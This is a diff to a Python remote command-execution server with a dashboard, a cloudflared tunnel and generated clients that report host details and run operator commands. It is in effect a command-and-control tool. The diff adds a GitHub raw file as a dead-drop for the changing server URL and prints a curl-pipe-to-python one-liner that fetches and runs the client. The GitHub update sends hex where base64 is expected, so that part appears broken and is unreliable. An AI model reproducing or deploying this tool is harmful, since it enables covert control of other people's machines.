@@ -1,13 +1,12 @@
 #!/usr/bin/env python3
 """
 Command Server — single-file remote command execution + web dashboard.
-Starts cloudflared automatically and shows the public URL.
-Requires: pip install aiohttp
+Starts cloudflared automatically. Clients read the URL from GitHub.
+Requires: pip install aiohttp websockets
 Run:      python3 server.py
 """
 
 import asyncio
-import hashlib
 import json
 import secrets
 import os
@@ -30,6 +29,8 @@ DATA_DIR.mkdir(exist_ok=True)
 CLIENTS_FILE = DATA_DIR / "clients.json"
 CONFIG_FILE = DATA_DIR / "config.json"
 
+GITHUB_URL_FILE = "https://raw.githubusercontent.com/yvlfiction/server/refs/heads/main/site"
+
 # ─── LOAD / SAVE CONFIG ───────────────────────────────────────────────────────
 def load_config():
     if CONFIG_FILE.exists():
@@ -43,7 +44,6 @@ config = load_config()
 
 # ─── CLOUDFLARED ──────────────────────────────────────────────────────────────
 def start_cloudflared():
-    """Start cloudflared quick tunnel and extract the URL."""
     proc = subprocess.Popen(
         ["cloudflared", "tunnel", "--url", f"http://localhost:{PORT}"],
         stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
@@ -65,13 +65,13 @@ CLIENT_TEMPLATE = r'''
 import asyncio, json, os, platform, socket, subprocess, sys, urllib.request, websockets
 
 SERVER_URL = "__SERVER_URL__"
+CONFIG_URL = "__CONFIG_URL__"
 
 async def get_current_url():
-    """Fetch the latest server URL from the server itself."""
     try:
-        req = urllib.request.Request(f"https://{SERVER_URL}/api/config")
+        req = urllib.request.Request(CONFIG_URL)
         with urllib.request.urlopen(req, timeout=5) as r:
-            return json.loads(r.read())["server_url"]
+            return r.read().decode().strip()
     except Exception:
         return SERVER_URL
 
@@ -80,7 +80,6 @@ async def main():
         try:
             url = await get_current_url()
             async with websockets.connect(f"wss://{url}/ws/client") as ws:
-                # Register
                 await ws.send(json.dumps({{"type": "register", "id": "__CLIENT_ID__", "token": "__CLIENT_TOKEN__",
                     "info": {{"os": platform.system(), "user": os.environ.get("USER", os.environ.get("USERNAME","?")),
                               "host": socket.gethostname(), "arch": platform.machine()}}}}))
@@ -116,6 +115,7 @@ body{background:#0a0a0a;color:#fff;font-family:'Courier New',monospace;min-heigh
 .url-box button{background:#0f0;color:#000;border:none;padding:8px 18px;cursor:pointer;border-radius:4px;font-family:inherit;font-weight:bold;font-size:.85rem}
 .url-box button:hover{box-shadow:0 0 12px #0f0}
 .url-box .saved{color:#0f0;font-size:.75rem;display:none}
+.url-box .github-link{color:#888;font-size:.75rem;margin-top:6px;display:block;width:100%}
 .clients{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:16px}
 .card{background:#111;border:1px solid #0f0;border-radius:8px;padding:16px;position:relative;box-shadow:0 0 8px rgba(0,255,0,.15)}
 .card .name{color:#0f0;font-weight:bold;font-size:1.1rem;text-shadow:0 0 6px #0f0}
@@ -157,8 +157,9 @@ body{background:#0a0a0a;color:#fff;font-family:'Courier New',monospace;min-heigh
   <div class="url-box">
     <label>Server URL:</label>
     <input id="url-input" placeholder="your-tunnel.trycloudflare.com">
-    <button onclick="saveUrl()">Save</button>
+    <button onclick="saveUrl()">Save to GitHub</button>
     <span class="saved" id="url-saved">✓ saved</span>
+    <span class="github-link">Clients read this from: <a href="__GITHUB_URL_FILE__" target="_blank" style="color:#0f0">github.com/yvlfiction/server/site</a></span>
   </div>
   <div class="section-title">Connected Clients</div>
   <div class="clients" id="clients"><div class="empty">No clients connected</div></div>
@@ -192,7 +193,6 @@ const urlInput = document.getElementById('url-input');
 const urlSaved = document.getElementById('url-saved');
 const rebuildOut = document.getElementById('rebuild-out');
 
-// Load current URL
 fetch('/api/config').then(r=>r.json()).then(d=>{ urlInput.value = d.server_url || ''; });
 
 function connect() {
@@ -230,7 +230,7 @@ function closeTerm() { termOverlay.classList.remove('active'); currentClient = n
 function sendCmd() {
   const cmd = termInput.value.trim();
   if (!cmd || !currentClient) return;
-  termBody.innerHTML += `<div class="prompt">$ ${cmd}</div><div class="output" id="out-${Date.now()}">⏳ running…</div>`;
+  termBody.innerHTML += `<div class="prompt">$ ${cmd}</div><div class="output">⏳ running…</div>`;
   termBody.scrollTop = termBody.scrollHeight;
   ws.send(JSON.stringify({type:'cmd', id: currentClient, cmd}));
   termInput.value = '';
@@ -298,7 +298,8 @@ def broadcast():
 # ─── HANDLERS ─────────────────────────────────────────────────────────────────
 
 async def index(request):
-    return web.Response(text=DASHBOARD_HTML, content_type="text/html")
+    html = DASHBOARD_HTML.replace("__GITHUB_URL_FILE__", GITHUB_URL_FILE)
+    return web.Response(text=html, content_type="text/html")
 
 async def api_config_get(request):
     return web.json_response(config)
@@ -306,9 +307,39 @@ async def api_config_get(request):
 async def api_config_post(request):
     data = await request.json()
     if "server_url" in data:
-        config["server_url"] = data["server_url"].strip().replace("https://", "").replace("http://", "")
+        url = data["server_url"].strip().replace("https://", "").replace("http://", "")
+        config["server_url"] = url
         save_config(config)
-        print(f"\n  [config] Server URL updated: {config['server_url']}")
+        # Write to GitHub via API
+        try:
+            import urllib.request
+            # Read current file to get sha
+            req = urllib.request.Request(
+                "https://api.github.com/repos/yvlfiction/server/contents/site",
+                headers={"Authorization": f"token {os.environ.get('GITHUB_TOKEN','')}"}
+            )
+            with urllib.request.urlopen(req) as r:
+                sha = json.loads(r.read())["sha"]
+            # Update
+            req2 = urllib.request.Request(
+                "https://api.github.com/repos/yvlfiction/server/contents/site",
+                data=json.dumps({
+                    "message": f"Update URL: {url}",
+                    "content": url.encode().hex(),
+                    "sha": sha
+                }).encode(),
+                headers={
+                    "Authorization": f"token {os.environ.get('GITHUB_TOKEN','')}",
+                    "Content-Type": "application/json"
+                },
+                method="PUT"
+            )
+            with urllib.request.urlopen(req2) as r:
+                pass
+            print(f"\n  [config] URL updated on GitHub: {url}")
+        except Exception as e:
+            print(f"\n  [config] GitHub update failed: {e}")
+            print(f"  [config] URL saved locally: {url}")
     return web.json_response({"ok": True, "server_url": config["server_url"]})
 
 async def dashboard_ws_handler(request):
@@ -378,7 +409,7 @@ async def client_download(request):
     clients[cid] = {"token": token, "info": {}, "ws": None, "since": 0}
     save_clients()
     server_url = config["server_url"] or request.host
-    code = CLIENT_TEMPLATE.replace("__CLIENT_ID__", cid).replace("__CLIENT_TOKEN__", token).replace("__SERVER_URL__", server_url)
+    code = CLIENT_TEMPLATE.replace("__CLIENT_ID__", cid).replace("__CLIENT_TOKEN__", token).replace("__SERVER_URL__", server_url).replace("__CONFIG_URL__", GITHUB_URL_FILE)
     return web.Response(text=code, content_type="text/x-python")
 
 async def api_rebuild(request):
@@ -387,7 +418,7 @@ async def api_rebuild(request):
     clients[cid] = {"token": token, "info": {}, "ws": None, "since": 0}
     save_clients()
     server_url = config["server_url"] or f"localhost:{PORT}"
-    code = CLIENT_TEMPLATE.replace("__CLIENT_ID__", cid).replace("__CLIENT_TOKEN__", token).replace("__SERVER_URL__", server_url)
+    code = CLIENT_TEMPLATE.replace("__CLIENT_ID__", cid).replace("__CLIENT_TOKEN__", token).replace("__SERVER_URL__", server_url).replace("__CONFIG_URL__", GITHUB_URL_FILE)
     return web.Response(text=f"# Client ID: {cid}\n# Save as client.py and run: python3 client.py\n\n{code}", content_type="text/plain")
 
 async def api_clients(request):
@@ -405,9 +436,37 @@ async def on_startup(app):
     if url:
         config["server_url"] = url
         save_config(config)
+        # Also write to GitHub
+        try:
+            import urllib.request
+            req = urllib.request.Request(
+                "https://api.github.com/repos/yvlfiction/server/contents/site",
+                headers={"Authorization": f"token {os.environ.get('GITHUB_TOKEN','')}"}
+            )
+            with urllib.request.urlopen(req) as r:
+                sha = json.loads(r.read())["sha"]
+            req2 = urllib.request.Request(
+                "https://api.github.com/repos/yvlfiction/server/contents/site",
+                data=json.dumps({
+                    "message": f"Auto-update URL: {url}",
+                    "content": url.encode().hex(),
+                    "sha": sha
+                }).encode(),
+                headers={
+                    "Authorization": f"token {os.environ.get('GITHUB_TOKEN','')}",
+                    "Content-Type": "application/json"
+                },
+                method="PUT"
+            )
+            with urllib.request.urlopen(req2) as r:
+                pass
+            print(f"  ✓ URL pushed to GitHub")
+        except Exception as e:
+            print(f"  ⚠ GitHub push failed: {e}")
+            print(f"  ⚠ Set GITHUB_TOKEN env var to auto-push")
         print(f"  ✓ Public URL: https://{url}")
     else:
-        print(f"  ⚠ Could not detect tunnel URL. Set it manually in the dashboard.")
+        print(f"  ⚠ Could not detect tunnel URL.")
     print(f"\n  Dashboard: http://localhost:{PORT}")
     print(f"  Client:    curl -s https://{url or '<your-url>'}/client | python3\n")
     app["cf_proc"] = cf_proc
